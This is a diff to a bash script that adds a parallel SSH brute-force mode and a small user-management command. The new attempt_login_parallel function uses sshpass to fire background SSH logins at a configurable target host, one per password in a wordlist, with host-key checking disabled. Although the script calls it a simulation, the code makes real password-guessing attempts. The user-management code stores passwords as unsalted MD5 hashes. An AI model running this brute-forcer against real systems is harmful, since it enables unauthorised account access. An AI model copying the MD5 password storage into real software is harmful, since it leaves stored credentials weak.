@@ -75,6 +75,42 @@ show_help() {
     echo "  -h, --help      Show this help message"
     echo "  -a, --analyze   Run log analysis"
     echo "  -s, --simulate  Run brute force simulation"
+    echo "  -p, --parallel  Run brute force simulation in parallel"
+}
+
+# Function to simulate brute force login attempts in parallel
+attempt_login_parallel() {
+    local password=$1
+    echo "Trying password: $password"
+    sshpass -p "$password" ssh -o StrictHostKeyChecking=no $TARGET_USER@$TARGET_HOST exit 2>/dev/null &
+}
+
+# Function to handle user account management
+user_management() {
+    case $1 in
+        add)
+            read -p "New username: " new_user
+            read -sp "New password: " new_pass
+            echo
+            new_pass_hash=$(echo -n "$new_pass" | md5sum | awk '{print $1}')
+            USERS["$new_user"]="$new_pass_hash"
+            echo "User $new_user added."
+            ;;
+        delete)
+            read -p "Username to delete: " del_user
+            unset USERS["$del_user"]
+            echo "User $del_user deleted."
+            ;;
+        list)
+            echo "Current users:"
+            for user in "${!USERS[@]}"; do
+                echo "$user"
+            done
+            ;;
+        *)
+            echo "Usage: $0 user [add|delete|list]"
+            ;;
+    esac
 }
 
 # Parse command-line arguments
@@ -91,6 +127,14 @@ while [[ $# -gt 0 ]]; do
         -s|--simulate)
             RUN_SIMULATE=true
             shift
+            ;;
+        -p|--parallel)
+            RUN_PARALLEL=true
+            shift
+            ;;
+        user)
+            user_management "$2"
+            exit 0
             ;;
         *)
             echo "Unknown option: $1"
@@ -110,6 +154,15 @@ if [[ "$RUN_SIMULATE" == true ]]; then
         attempt_login "$password"
     done < "$PASSWORD_FILE"
     echo "Brute force attack simulation completed."
+fi
+
+if [[ "$RUN_PARALLEL" == true ]]; then
+    echo "Starting brute force attack simulation in parallel..."
+    while IFS= read -r password; do
+        attempt_login_parallel "$password"
+    done < "$PASSWORD_FILE"
+    wait
+    echo "Brute force attack simulation in parallel completed."
 fi
 
 if [[ "$RUN_ANALYZE" == true ]]; then
